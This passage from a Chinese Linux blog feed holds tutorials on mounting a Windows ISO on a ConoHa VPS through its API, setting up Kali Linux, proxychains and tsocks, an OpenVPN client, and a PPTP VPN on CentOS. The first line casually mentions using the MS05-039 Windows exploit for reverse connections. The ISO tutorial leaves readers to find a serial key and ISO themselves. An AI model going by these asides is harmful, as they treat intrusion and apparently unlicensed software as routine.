Plug and Play Service Overflow (CVE-2005-1983, MSB-MS05-039):</strong> MS05-039是一个远程执行代码和本地特权提升漏洞，在 Windows 2000 上，匿名攻击者可能试图远程利用此漏洞。相信很多朋友都用ms05039做过反弹:)<br><br></div>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[ConoHa vps购买折腾]]></title>
      <url>http://www.linux52.com/2015-06-18-conoha-vps-e8-b4-ad-e4-b9-b0-e6-8a-98-e8-85-be.html</url>
      <content type="html"><![CDATA[<p>听基友说conoha vps支持支付宝购买很便宜 1G内存的一个月也就45块左右 想要购买的点下面地址购买</p>
<p><strong><span style="color: #ff0000;"><a href="https://www.conoha.jp/referral/?token=hq7jXg1HaJaehF4HhbF6NcNNZQ13pzfNE9rRFi1awhulcdd3Y9c-GYJ" title="购" target="_blank" rel="external">购买地址</a> </span></strong></p>
<p><strong><span><span style="color: #000000;">最低冲入500日元=25块左右吧 上面地址注册可得到1000日元曾送</span></span></strong></p>
<p><a href="http://dg2016.duapp.com/wp-content/uploads/2015/06/QQ图片20150617234529.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2015/06/QQ图片20150617234529-300x135.png" alt="QQ图片20150617234529"></a></p>
<p>注册就不说了 点右上解申请（注意一点就是那个密码要有特殊符号我就纠结半天没注册上）</p>
<p>下面说挂载自定义iso</p>
<p><a href="http://dg2016.duapp.com/wp-content/uploads/2015/06/sh.tar.gz" title="脚本下载" target="_blank" rel="external">脚本下载</a> ftp地址就不给了</p>
<p>转老左的吧</p>
<p><strong>第一、部署Windows系统挂载准备工作</strong></p>
<p>A - 我们需要有另外一台Linux机器用来执行相关的挂载命令</p>
<p>B - 我们需要有ConoHa账户（没有机器你还安装什么），目前新注册账户有赠送1000日元（<a href="https://www.conoha.jp/referral/?token=hq7jXg1HaJaehF4HhbF6NcNNZQ13pzfNE9rRFi1awhulcdd3Y9c-GYJ" target="_blank" rel="external">ConoHa注册教程</a>），前提是我们注册账户后需要充值最低500日元（25元左右）。</p>
<blockquote>
<p>如你想使用Conoha VPS必须先注册账户：<a href="https://www.conoha.jp/referral/?token=hq7jXg1HaJaehF4HhbF6NcNNZQ13pzfNE9rRFi1awhulcdd3Y9c-GYJ" target="_blank" rel="external">进入</a> （目前新注册赠送1000日元）<br>C - 我们需要准备FTP格式的Windows ISO文件，且需要已经带有virtio驱动。</p>
</blockquote>
<p>D - 我们需要有足够的耐心和细心看完这篇文章，因为我为了这篇文章折腾一下午了。</p>
<p>PS：我们也可以参考”<a href="http://www.laozuo.org/4019.html" target="_blank" rel="external">Vultr VPS挂载ISO安装Windows 2003系统完整过程</a>“文章，在Vultr VPS中自定义安装WINDOWS系统。</p>
<p><strong>第二、ConoHa API安装Windows系统过程</strong></p>
<p>A - 新开一台机器</p>
<p>我们需要先开一台ConoHa机器，比如日本或者新加坡都可以，但之间也是有区别的，这里老左就开了一台日本的1GB内存方案，开通机器后先关闭机器，因为开着机器安装不成功。</p>
<p>B - 创建API用户</p>
<p><img src="http://www.laozuo.org/wp-content/uploads/2015/06/api-conoha-1.jpg" alt="创建API用户"></p>
<p>在后台菜单左侧API选项，因为我们没有创建用户，所以需要先追加一个用户，设置API密码（需要9位，数字+字母+特殊符号），创建完毕之后我们需要得到上面看到的店铺ID和店铺名称。</p>
<p><img src="http://www.laozuo.org/wp-content/uploads/2015/06/api-conoha-2.jpg" alt="api-conoha-2"></p>
<p>C - API地址</p>
<p>在上图中，我们可以看到”终点”，里面的信息可以找到API地址，比如我这里需要日本东京的API地址。</p>
<p><img src="http://www.laozuo.org/wp-content/uploads/2015/06/api-conoha-3.jpg" alt="api-conoha-3"></p>
<p>我们这里先记着，可以先复制下来，等会都需要用到。</p>
<p>D - 部署ISO</p>
<blockquote>
<p>curl -i -X POST \</p>
<p>-H “Accept: application/json” \</p>
<p>-d ‘{</p>
<p>“auth”: {</p>
<p>“passwordCredentials”: {</p>
<p>“username”: “API店铺名称”,</p>
<p>“password”: “API用户密码”</p>
<p>},</p>
<p>“tenantId”: “API店铺ID”</p>
<p>}</p>
<p>}’ \</p>
<p><a href="https://identity.tyo1.conoha.io/v2.0/tokens（日本东京的API地址，如果你也是日本VPS就不要修改了）" target="_blank" rel="external">https://identity.tyo1.conoha.io/v2.0/tokens（日本东京的API地址，如果你也是日本VPS就不要修改了）</a><br>执行上面的脚本，以及对应的参数需要修改成我们自己的，上面脚本默认的是日本API，如果是新加坡我们需要更换。</p>
</blockquote>
<p><img src="http://www.laozuo.org/wp-content/uploads/2015/06/api-conoha-4.jpg" alt="api-conoha-4"></p>
<p>然后我们会看到返回一串字符，不要怕，我们就需要这个，找到其中的id后面的字符，比如我这里需要的是”1d425c497fc14192845d80de00656cfd”记录下来，因为后面需要用到X-Auth-Token参数上。</p>
<blockquote>
<p>curl -i -X POST \</p>
<p>-H ‘Content-Type: application/json’ \</p>
<p>-H “Accept: application/json” \</p>
<p>-H “X-Auth-Token: （TAB空格）就是上面得到的id” \</p>
<p>-d ‘{</p>
<p>“iso-image”: {</p>
<p>“url”: “FTP格式的ISO地址”</p>
<p>}</p>
<p>}’ \</p>
<p><a href="https://compute.tyo1.conoha.io/v2/店铺ID/iso-images（这一行一样是东京的API）" target="_blank" rel="external">https://compute.tyo1.conoha.io/v2/店铺ID/iso-images（这一行一样是东京的API）</a><br>然后我们执行上面的脚本，鉴于版权以及各种原因，老左就不公开分享FTP格式地址的ISO地址，我们自行解决，我自己也是找书生要了一个地址，人家是用来帮助付费安装的，我就不免费公开了。</p>
</blockquote>
<p><img src="http://www.laozuo.org/wp-content/uploads/2015/06/api-conoha-5.jpg" alt="api-conoha-5"></p>
<p>执行后会出现上面的提示，如果我们需要检查是否挂载上去，通过下面的命令。</p>
<blockquote>
<p>curl -i -X GET \</p>
<p>-H ‘Content-Type: application/json’ \</p>
<p>-H “Accept: application/json” \</p>
<p>-H “X-Auth-Token: （TAB空格）就是上面得到的id” \</p>
<p><a href="https://compute.tyo1.conoha.io/v2/店铺ID/iso-images" target="_blank" rel="external">https://compute.tyo1.conoha.io/v2/店铺ID/iso-images</a><br>执行后，我们需要得到path后面的参数。</p>
</blockquote>
<p><img src="http://www.laozuo.org/wp-content/uploads/2015/06/api-conoha-6.jpg" alt="api-conoha-6"></p>
<p>PATH地址我们需要记录下来，后面有需要用到。</p>
<p><strong>第三、设置VPS控制台键盘映射</strong></p>
<p><img src="http://www.laozuo.org/wp-content/uploads/2015/06/api-conoha-7.jpg" alt="api-conoha-7"></p>
<p>这里我们需要两样东东，上面的UUID需要记录下来等会用到，控制台键盘映射需要设置成EN-US</p>
<blockquote>
<p>curl -i -X POST \</p>
<p>-H “Accept: application/json” \</p>
<p>-H “X-Auth-Token: （TAB空格）就是上面得到的id” \</p>
<p>-d ‘{“mountImage”: “之前一步记录下来的PATH路径”}’ \</p>
<p><a href="https://compute.tyo1.conoha.io/v2/店铺ID/servers/VPS的UUID/action" target="_blank" rel="external">https://compute.tyo1.conoha.io/v2/店铺ID/servers/VPS的UUID/action</a><br>这一步就是真正的挂载过去了，检查是否成功，用下面命令。<br>curl -i -X GET \</p>
<p>-H “Accept: application/json” \</p>
<p>-H “X-Auth-Token: （TAB空格）就是上面得到的id” \</p>
<p><a href="https://compute.tyo1.conoha.io/v2/店铺ID/servers/VPS的UUID" target="_blank" rel="external">https://compute.tyo1.conoha.io/v2/店铺ID/servers/VPS的UUID</a><br>如果有看到类似下面的挂载ISO地址，基本上没问题了。</p>
</blockquote>
<p><img src="http://www.laozuo.org/wp-content/uploads/2015/06/api-conoha-9.jpg" alt="api-conoha-9"></p>
<p>看到没有，有没有？到目前为止我们已经成功95%，后面我们就VPS开机（上面所有的步骤VPS都要关机状态，否则不要说为什么不成功）。</p>
<p><strong> 第四、VNC部署WINDOWS系统</strong></p>
<p>如果我们能完成上面的步骤，这一步就很简单了，我们开机VPS，然后通过VNC打开窗口部署WINDOWS系统。</p>
<p><img src="http://www.laozuo.org/wp-content/uploads/2015/06/api-conoha-10.jpg" alt="VNC部署WINDOWS系统"></p>
<p>登录后按任意键从光驱启动，会看到我们熟悉的WINDOWS安装界面。</p>
<p><img src="http://www.laozuo.org/wp-content/uploads/2015/06/api-conoha-11.jpg" alt="Conoha vps部署window系统"></p>
<p>老左连URL都截图下来，说明这篇文章的完整性不是忽悠的，肯定是可以安装成功的，只要你细心，认真。后面是不是很简单，如果我们会安装系统，认识中文，就可以把WINDOWS安装完成。</p>
<p><img src="http://www.laozuo.org/wp-content/uploads/2015/06/api-conoha-12.jpg" alt="api-conoha-12"></p>
<p>是不是看着很美好，其中有一个细节，因为原本是LINUX有一个分区，我们需要格式化掉所有的盘，然后重新整一个盘然后安装。总之到这里了，对于你们来说都不是难事。</p>
<p><img src="http://www.laozuo.org/wp-content/uploads/2015/06/api-conoha-13.jpg" alt="api-conoha-13"></p>
<p>因为是SSD固态硬盘，所以一切很快。其中根据我们用的ISO包，需要用到序列号，这个我们自己寻找。</p>
<p><img src="http://www.laozuo.org/wp-content/uploads/2015/06/api-conoha-14.jpg" alt="api-conoha-14"></p>
<p>快成功了！</p>
<p><img src="http://www.laozuo.org/wp-content/uploads/2015/06/api-conoha-15.jpg" alt="完整利用ConoHa VPS主机API接口自定义安装Windows系统过程"></p>
<p>看到这里是不是完全确定可以OK？</p>
<p>总结，这篇文章花费的时间较长，但至少已经能够完整的分享出来，所以如果有需要参考和转载的，麻烦注明出处，有几个IT类文章站稍微给点面子，转载就转载了，把我名字都换成你的了。如果还有朋友看到不会安装的，可以加到Q群，找我们安装，里面有些同学安装这些东东是职业的。</p>
<p><div></div><br>本文固定链接: <a href="http://www.laozuo.org/6073.html" title="完整利用ConoHa VPS主机API接口自定义安装Windows系统过程" target="_blank" rel="external">http://www.laozuo.org/6073.html | 老左博客</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux 新手折腾笔记]]></title>
      <url>http://www.linux52.com/2015-05-16-kali-linux-e6-96-b0-e6-89-8b-e6-8a-98-e8-85-be-e7-ac-94-e8-ae-b0.html</url>
      <content type="html"><![CDATA[<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p><a href="http://dg2016.duapp.com/wp-content/uploads/2015/05/kali.jpg" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2015/05/kali-300x169.jpg" alt="kali"></a></p>
<p>&nbsp;</p>
<p>更多请看<a href="http://os.51cto.com/art/201405/439494_all.htm" target="_blank" rel="external">http://os.51cto.com/art/201405/439494_all.htm</a></p>
<h3 id="1-更新软件源："><a href="#1-更新软件源：" class="headerlink" title="1.更新软件源："></a>1.更新软件源：</h3><p>先备份软件源<strong>sources.list</strong>文件，然后修改sources.list文件，在终端输入：</p>
<div class="dp-highlighter"><br><br>1.  leafpad /etc/apt/sources.list<br></div><br>然后添加以下较快的源：<br><div class="dp-highlighter"><br><br>1.  #中科大kali源<br>2.  deb http:<span class="comment">//mirrors.ustc.edu.cn/kali kali main non-free contrib</span><br>3.  deb-src http:<span class="comment">//mirrors.ustc.edu.cn/kali kali main non-free contrib</span><br>4.  deb http:<span class="comment">//mirrors.ustc.edu.cn/kali-security kali/updates main contrib non-free</span><br>5.6.  #阿里云kali源<br>7.  deb http:<span class="comment">//mirrors.aliyun.com/kali kali main non-free contrib</span><br>8.  deb-src http:<span class="comment">//mirrors.aliyun.com/kali kali main non-free contrib</span><br>9.  deb http:<span class="comment">//mirrors.aliyun.com/kali-security kali/updates main contrib non-free</span><br></div><br>然后保存，再到终端更新：<br><div class="dp-highlighter"><br><br>1.  apt-get update               #刷新系统<br>2.  apt-get dist-upgrade      #安装更新<br></div><br>当一切更新完之后，想要修改主题该怎么办呢？<br><br>首先，需要安装一个主题管理软件（<strong>gnome-tweak-tool</strong> ），只需要执行：apt-get install gnome-tweak-tool 就可以了。<br><br>安装完之后，执行：gnome-tweak-tool 命令进行打开Gnome，我们到：<a href="http://gnome-look.org" target="_blank" rel="external">http://gnome-look.org</a> 这个网站，选取我们喜欢的主题。下载下来之后，然后解压复制到主题存放的文件夹下：/usr/share/themes ，之后再回到刚才那个gnome-tweak-tool界面，开始各种设置。<br><br>###  2.安装中文输入法<br><br>从BackTrack系统开始，一直在用经典的iBus，切换快捷键Ctrl+Space(空格键)，安装命令：<br><div class="dp-highlighter"><br><br>1.  apt-get install ibus ibus-pinyin    #经典的ibus输入法<br></div><br>注：安装完成后需要重启。<br><br>### 3.安装flash player<br><br><div class="dp-highlighter"><br><br>1.  apt-get install flashplugin-nonfree<br>2.  update-flashplugin-nonfree –install<br></div><br>注：安装完成后需要重启。<br><br>### 4.安装其他一些工具<br><br><div class="dp-highlighter"><br><br>1.  apt-get install synaptic                   #安装新立得<br>2.  apt-get install software-center      #安装ubuntu软件中心<br>3.  apt-get install file-roller                #安装解压缩软件<br>4.  apt-get install gedit                      #安装gedit编辑软件<br>5.  apt-get install audacious             #audacious音乐播放器<br>6.  apt-get install smplayer              #安装smplayer视频播放器<br></div>

<h3 id="5-安装最新iceweasel，并汉化iceweasel浏览器"><a href="#5-安装最新iceweasel，并汉化iceweasel浏览器" class="headerlink" title="5.安装最新iceweasel，并汉化iceweasel浏览器"></a>5.安装最新iceweasel，并汉化iceweasel浏览器</h3><p>Kali Linux 遵循Debian开发标准，系统安装完成后，自带的浏览器iceweasel默认为英文版，介于强迫症，还是做一个简单的汉化吧，在终端输入：</p>
<div class="dp-highlighter"><br><br>1.  apt-get install iceweasel-l10n-zh-cn<br></div><br><strong>ps：然后关机重启！</strong><br><br><strong>如何更新到最新版iceweasel浏览器，首先在软件源中添加：</strong><br><div class="dp-highlighter"><br><br>1.  deb http:<span class="comment">//mozilla.debian.net/ wheezy-backports iceweasel-release</span><br></div><br>然后在终端执行以下代码：<br><div class="dp-highlighter"><br><br>1.  apt-get install pkg-mozilla-archive-keyring                    #导入PGP KEY<br>2.  gpg –check-sigs –fingerprint –keyring /etc/apt/trusted.gpg.d/pkg-mozilla-archive-keyring.gpg –keyring /usr/share/keyrings/debian-keyring.gpg pkg-mozilla-maintainers  #新建钥匙环<br>3.  apt-get update &amp;&amp; apt-get install -t wheezy-backports iceweasel &amp;&amp; apt-get install iceweasel-l10n-zh-cn<br>&nbsp;<br><br><strong>确保启动时发出声音</strong><br><br>遵照下列步骤，即可解决Kali Linux中启动时没有声音的问题。<br><br>1.  apt-get install alsa-utils -y<br>在GNOME桌面（默认是Kali桌面）中：<br><br>鼠标右击小小的音量图标，选择Sound Preferences（声音首选项）。<br><br>此外，你还可以依次进入到Applications（应用程序）&gt; System Tools（系统工具）&gt; Preferences（首选项）&gt; System Settings（系统设置）&gt; Sound（声音），即可调出同样的选项。<br><br>将Output volume（输出音量）滑块切换到ON（打开），类似下面的屏幕截图。这就是你要做的。关闭Sound（声音）窗口。<br><br><a href="http://dg2016.duapp.com/wp-content/uploads/2015/05/wKiom1N0IObgDue-AACpKMTi3-c960.jpg" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2015/05/wKiom1N0IObgDue-AACpKMTi3-c960-300x270.jpg" alt="wKiom1N0IObgDue-AACpKMTi3-c960"></a><br><br>&nbsp;<br><br></div>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Linux中任意软件通过代理上网（非vpn）]]></title>
      <url>http://www.linux52.com/2015-04-26-linux-e4-b8-ad-e4-bb-bb-e6-84-8f-e8-bd-af-e4-bb-b6-e9-80-9a-e8-bf-87-e4-bb-a3-e7-90-86-e4-b8-8a-e7-bd-91-ef-bc-88-e9-9d-9evpn-ef-bc-89.html</url>
      <content type="html"><![CDATA[<div>Linux中任意软件通过代理上网（非vpn）</div><br><div></div><br><div>这里有一个重点就是利用shadowsocks 先代理 请看这<a href="http://dg2016.duapp.com/archives/45" target="_blank" rel="external">http://dg2016.duapp.com/archives/45</a></div><br><div></div><br><div>在windows中，有 SocksCap32、 ProxyCap、FreeCap、Proxifier 能够实现任意软件通过代理上网了，本博在之前有介绍过： <a href="http://www.2cto.com/net/201207/142900.html" target="_blank" rel="external">http://www.2cto.com/net/201207/142900.html</a> ，在ubuntu等linux发行版中如何实现呢？</div><br><div>当然，前提是你要先链接好ssh<a href="http://www.2cto.com/Article/jiami/" target="_blank" rel="external">加密</a>通道，或者支持socks4/5的连接方式。准备好后，就可以利用以下两种方法实现。</div><br><div> 方法一:</div><br><div>安装proxychains</div><br><div>sudo apt-get install proxychains</div><br><div>修改配置文件 (/etc/proxychains.conf)，如下：</div><br><div>  www.2cto.com</div><br><div># proxychains.conf  VER 2.0</div><br><div>#</div><br><div>#        HTTP, SOCKS4, SOCKS5 tunneling proxifier.</div><br><div>#</div><br><div># The option below identifies how the ProxyList is treated.</div><br><div># only one option should be uncommented at time,</div><br><div># otherwise the last appearing option will be accepted</div><br><div>#</div><br><div># Dynamic - Each connection will be done via chained proxies</div><br><div># all proxies chained in the order as they appear in the list</div><br><div># at least one proxy must be online to play in chain</div><br><div># (dead proxies are skipped)</div><br><div># otherwise EINTR is returned to the app</div><br><div>#</div><br><div># Strict - Each connection will be done via chained proxies</div><br><div># all proxies chained in the order as they appear in the list</div><br><div># all proxies must be online to play in chain</div><br><div># otherwise EINTR is returned to the app</div><br><div>#  www.2cto.com</div><br><div># Random - Each connection will be done via random proxy</div><br><div># (or proxy chain, see  chain_len) from the list</div><br><div># this option is good for scans</div><br><div></div><br><div>dynamic_chain</div><br><div>#strict_chain</div><br><div>#random_chain</div><br><div></div><br><div># Make sense only if random_chain</div><br><div>chain_len = 2</div><br><div></div><br><div># Quiet mode (no output)</div><br><div>#quiet_mode</div><br><div></div><br><div># Write stats about good proxies to proxychains.stats</div><br><div>#write_stats</div><br><div></div><br><div>#Some timeouts in milliseconds</div><br><div>#</div><br><div>tcp_read_time_out 15000</div><br><div>tcp_connect_time_out 10000</div><br><div>  www.2cto.com</div><br><div>[ProxyList]</div><br><div># ProxyList format</div><br><div>#       type  host  port [user pass]</div><br><div>#       (values separated by ‘tab’ or ‘blank’)</div><br><div>#</div><br><div>#</div><br><div>#        Examples:</div><br><div>#</div><br><div>#             socks5 192.168.67.78 1080 lamer  secret</div><br><div>#  http 192.168.89.3 8080 justu hidden</div><br><div>#   socks4 192.168.1.49 1080</div><br><div>#         http 192.168.39.93 8080</div><br><div>#</div><br><div>#</div><br><div>#       proxy types: http, socks4, socks5</div><br><div>#        ( auth types supported: “basic”-http  “user/pass”-socks )</div><br><div>##http  10.0.0.5 3128</div><br><div>socks5 127.0.0.1 7070</div><br><div>socks4 127.0.0.1 9050</div><br><div>注意事项:</div><br><div></div><br><div>要选 dynamic_chain 而不是 random_chain</div><br><div>可以列举几个代理服务器，proxychains 会按顺序用，代理无法访问即自动选用下一个</div><br><div>代理服务器要根据自己电脑的情况自行调整</div><br><div>运行 proxychains</div><br><div>  www.2cto.com</div><br><div>在终端中输入:</div><br><div>proxychains 你的软件 &amp;</div><br><div></div><br><div> 方法二： Tsocks是另一个能够强迫任何软件通过SOCKS代理上网的工具。</div><br><div>安装并配置 Tsocks</div><br><div></div><br><div>在终端中:</div><br><div>sudo apt-get install tsocks</div><br><div>修改配置文件:</div><br><div>sudo nano /etc/tsocks.conf</div><br><div>将其内容改成以下几行并保存退出:</div><br><div></div><br><div>local = 192.168.1.0/255.255.255.0 #local表示本地的网络，也就是不使用socks代理的网络</div><br><div>server = 127.0.0.1 # SOCKS 服务器的 IP</div><br><div>server_type = 5 # SOCKS 服务版本，4或5</div><br><div>server_port =  9999   ＃SOCKS 服务使用的端，根据自己的情况自行修改</div><br><div>你可能需要修改一下以上内容，用你自己的 SSH 隧道设置。</div><br><div></div><br><div>运行软件</div><br><div>用 tsocks 运行你的软件很简单，在终端中:</div><br><div>tsocks 你的软件 &amp;</div><br><div></div><br><div>下面以ssh通道与tsocks为例：</div><br><div>  www.2cto.com</div><br><div>1：申请一个shell，网上有收费的，不过也有免费的（速度有点慢）；个人在<a href="http://www.cjb.net/" target="_blank" rel="external">http://www.cjb.net/</a> 申请的免费shell。（以前这个网站被封了）</div><br><div></div><br><div>2：使用ssh命令使用你申请时的帐号登录shell.cjb.net（Address: 216.194.70.6）（如果dns不能解析这个url，可以使用ip地址。）具体如下：</div><br><div>      ssh -D 9999 216.194.70.6 -l shellacount</div><br><div>      [解释：D选项指示你选择7070端口，l选项用于标明你的用户名，ip地址代表你将要登录的主机]</div><br><div>3：配置/etc/tsocks.conf，tsocks 你的软件 &amp;</div><br><div></div><br><div>～OK！！！</div><br><div></div><br><div></div><br><div>作者 acmfly</div>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntu下OpenVPN客户端配置教程]]></title>
      <url>http://www.linux52.com/2015-04-26-ubuntu-e4-b8-8bopenvpn-e5-ae-a2-e6-88-b7-e7-ab-af-e9-85-8d-e7-bd-ae-e6-95-99-e7-a8-8b.html</url>
      <content type="html"><![CDATA[<p>一般来说，提供Web服务的Linux服务器是很少需要连接OpenVPN的，但是个人Linux计算机在很多时候就需要连接OpenVPN了。比如以Linux为开发环境，需要连接公司的OpenVPN等等。</p>
<p>本文将以<a href="http://www.linuxidc.com/topicnews.aspx?tid=2" title="Ubuntu" target="_blank" rel="external">Ubuntu</a>系统为例，介绍在终端下连接远程OpenVPN服务的方法。</p>
<h4 id="安装OpenVPN"><a href="#安装OpenVPN" class="headerlink" title="安装OpenVPN"></a>安装OpenVPN</h4><p>首先需要安装OpenVPN客户端。一般来说直接使用apt-get即可。执行如下命令安装：</p>
<p><div id="highlighter_928430" class="syntaxhighlighter  "></div></p>
<p><div class="lines"></div></p>
<p><div class="line alt1"></div></p>
<p><table></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td class="number"><code>1</code></td></p>
<p><td class="content"><code>[root@www ~]``# apt-get install openvpn</code></td><br><br><br><br><br><br><br>稍等片刻将自动安装好openvpn需要的软件包。安装完成后，应该出现</p>
<p>/etc/openvpn/</p>
<p>文件夹。</p>
<h4 id="配置OpenVPN"><a href="#配置OpenVPN" class="headerlink" title="配置OpenVPN"></a>配置OpenVPN</h4><p>作为客户端，OpenVPN并没有特定的配置文件，而是由服务器提供方给出一个配置文件。对于认证，OpenVPN提供了两种认证方法：基于用户名/密码的认证与SSL证书认证。用户名/密码的认证方法无法（或较难）限制一个账号同时连接多个客户端，而采用证书，则可保证同一证书同一时间只能有一个客户端连接。当然，这些都是由服务器端决定的，不需要客户端进行选择。</p>
<p>首先将OpenVPN服务器提供商发给你的配置文件解压，并将所有文件都复制到 /etc/openvpn/中。</p>
<p>这些文件中至少包含一个.ovpn文件，需要手动创建该文件，如：client.ovpn；如果服务器需要证书认证，则应该还存在另外三个证书文件。</p>
<p>看懂OpenVPN配置格式。下面是一个.ovpn配置示例：</p>
<blockquote>
<p>client</p>
<p>dev tap</p>
<p>proto tcp-client</p>
<p>remote 192.168.135.75 1194</p>
<p>resolv-retry infinite</p>
<p>nobind</p>
<p>mute-replay-warnings</p>
<p>redirect-gateway</p>
<p>ca /etc/openvpn/ca.crt</p>
<p>cert /etc/openvpn/client.crt</p>
<p>key /etc/openvpn/client.key</p>
<p>comp-lzo</p>
<p>verb 4<br>一般来说，红色的内容可能需要你进行修改。将红色的内容修改成这三个文件的实际位置。然后保存即可。</p>
</blockquote>
<h4 id="连接OpenVPN"><a href="#连接OpenVPN" class="headerlink" title="连接OpenVPN"></a>连接OpenVPN</h4><p>在配置好.ovpn文件后，执行</p>
<blockquote>
<p>openvpn /etc/openvpn/client.ovpn<br>即可连接服务器了（注意该目录下对应文件的权限）。注意，上面的参数应该换成你的配置文件实际位置。</p>
</blockquote>
<p>此时，终端会回显很多连接日志。如果连接不成功，则可以通过这些日志来确定出错位置。如果要断开，只需要通过Ctrl+C强制终止即可。</p>
<p>上面的命令在实际中并不方便，因为它要占用一个独立的终端。在测试成功后，使用以下命令即可在后台连接OpenVPN：</p>
<blockquote>
<p>openvpn /etc/openvpn/client.ovpn &gt; /dev/null &amp;<br>值得称赞的是，openvpn非常智能，在连接异常中断、无法连接服务器、断网的情况下，它会自动重连。因此，如果希望开机即自动连接OpenVPN，或者是VPN常年在线，则可将上述命令行加入<br>/etc/rc.local<br>中。注意，命令末尾的&amp;符号不能省略，否则将可能阻塞系统的正常启动。</p>
</blockquote>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[centos6.4安装搭建pptp vpn服务]]></title>
      <url>http://www.linux52.com/2015-04-26-centos6-4-e5-ae-89-e8-a3-85-e6-90-ad-e5-bb-bapptp-vpn-e6-9c-8d-e5-8a-a1.html</url>
      <content type="html"><![CDATA[<p>&nbsp;</p>
<p>centos6.4安装搭建pptp vpn服务的<strong>大致步骤简介，下面会有详细的步骤</strong>(我不喜欢写大纲，决定麻烦，但是有人还是看不懂，所以勉为其难的写了个，实在不会的，我在文章的后面提供一些网上的centos pptp vpn 一键安装包，有人写了就不必再写一遍了，一键安装包要是有问题，也别找我，新手想享受自己亲手一步步具体搭建过程的乐趣，就接着看看吧)<strong>：</strong></p>
<blockquote>
<p>1.先检查vps是否满足配置pptp vpn的环境。因为有的openvz的vps被母鸡给禁用了。其实，你在配置前最好向vps的客服发TK，可能客服会帮你开通vpn或者客服那里会给你他们自己定制的vpn一键安装包也有可能。</p>
<p>2.接着是安装配置pptp vpn的相关软件，<strong>安装ppp和iptables</strong>。</p>
<p>配置安装好后的pptp软件，这个不像windows那样，安装的过程就是配置的过程。linux的要安装完之后，修改配置文件，才算是完成配置。</p>
<p>3.启动pptp vpn 服务。此时，就是检验你能够vpn拨号成功，如果你拨号成功了，说明你的pptp vpn的安装配置就算真正的完成了。但是此时只能登录vpn，却不能用来上网。</p>
<p>4.开启内核和iptables的转发功能。这个步骤是为了让你连上vpn之后，能够上网，上那些yourporn，youtube之类的。这步是最关键的，很多人能成功拨号，登录vpn，但是却不能上网就是因为这个步骤没做好。这步骤完成了，你就可以尽情去国外的网站访问了。</p>
<p>#########################################手动搭建配置pptp vpn 详细方法如下########</p>
</blockquote>
<p><strong>第一步</strong>：检测是否符合pptp的搭建环境的要求</p>
<div>服务器版本：CentOs 6.4 xen vps</div><br><div><br><div>如果检查结果没有这些支持的话，是不能安装pptp的。执行指令：</div><br>&gt; #modprobe ppp-compress-18 &amp;&amp; echo ok<br><div>这条执行执行后，显示“ok”则表明通过。不过接下来还需要做另一个检查，输入指令：</div><br>&gt; #cat /dev/net/tun<br><div>如果这条指令显示结果为下面的文本，则表明通过：</div><br><div>cat: /dev/net/tun: File descriptor in bad state</div><br><div>上述两条均通过，才能安装pptp。否则就只能考虑openvpn，或者请vps空间商的技术客服为你的VPS打开TUN/TAP/PPP功能了，貌似有部分vps控制面板上提供打开TUN/TAP/PPP功能的按钮。</div><br><div><br><div><strong>Cent os 6.4内核版本在2.6.15以上，都默认集成了MPPE和PPP，因此下面检查可以忽略：</strong></div><br><div><strong><a href="http://www.ksharpdabu.info/?p=2178" target="_blank" rel="external">http://www.ksharpdabu.info/?p=2178</a></strong></div><br>&gt; #rpm -q ppp //查询当前系统的ppp是否默认集成了，以及ppp的版本<br><div></div><br><div>检查PPP是否支持MPPE</div><br><div>用以下命令检查PPP是否支持MPPE：</div><br>&gt; #strings ‘/usr/sbin/pppd’ |grep -i mppe | wc –lines<br><div><strong><a href="http://www.ksharpdabu.info/?p=2178" target="_blank" rel="external">http://www.ksharpdabu.info/?p=2178</a></strong></div><br><div>如果以上命令输出为“0”则表示不支持；输出为“30”或更大的数字就表示支持，MPPE（Microsoft Point to Point Encryption，微软点对点加密）。</div><br></div><br></div><br><div></div><br><div><strong>第二步</strong>：</div><br><div><strong>1.安装ppp和iptables</strong></div><br><div></div><br><div>PPTPD要求Linux内核支持mppe，一般来说CentOS安装时已经包含了</div><br><div><strong><a href="http://www.ksharpdabu.info/?p=2178" target="_blank" rel="external">http://www.ksharpdabu.info/?p=2178</a></strong></div><br>&gt; <div>#yum install -y perl ppp iptables //centos默认安装了iptables和ppp</div><br>&gt;<br>&gt; <div></div><br><div></div><br><div></div><br><div><strong>2.安装pptpd</strong></div><br><div><br><br>刚才用了yum安装了ppp,但是这里有个问题，几乎大部分的人都会在这里遇到ppp和pptpd不兼容的错误。因为yum安装ppp，总是安装最新版本的ppp，而由于安装的ppp的版本不同，那么就需要安装对应版本的pptpd才行。(参考我的文章《<a href="http://www.ksharpdabu.info/ppp-2-4-4-is-needed-by-pptpd-1-3-4-2-rhel5-x86_64-solutions-and-reasons.html" target="_blank" rel="external">ppp = 2.4.4 is needed by pptpd-1.3.4-2.rhel5.x86_64的解决办法及原因</a>|<a href="http://www.ksharpdabu.info/" target="_blank" rel="external">大步’s blog</a>》)<br><br>我们要先查看已经安装的ppp的版本，在去找对应的pptpd版本。我手头刚好有两个vps，一个是前年装的pptp vpn，一个是一年后装的pptp vpn，所以，装的yum install ppp的版本不同。<br><br>使用下面的命令查看ppp的版本，前提你是yum安装的ppp。<br><br>旧的vps上的ppp版本显示：<br><br>#yum list installed ppp<br><br>显示：<br>&gt; ppp.i386                    <strong> 2.4.4-2.el5  </strong>                   installed<br>新的vps上的ppp版本显示；<br><br>#yum list installed ppp<br><br>显示：<br>&gt; ppp.i686                      <strong> 2.4.5-5.el6 </strong>                      @base<br>所以，要对根据ppp版本选择对应的pptpd版本。这里我主要列出常用的。<br>&gt; <strong>ppp 2.4.4——————&gt;pptpd 1.3.4</strong><br>&gt;<br>&gt;<br>&gt; <strong>ppp 2.5.0——————&gt;pptpd 1.4.0</strong><br>贴个ppp和pptpd各个版本的下载地址；<a href="http://poptop.sourceforge.net/yum/stable/packages/" target="_blank" 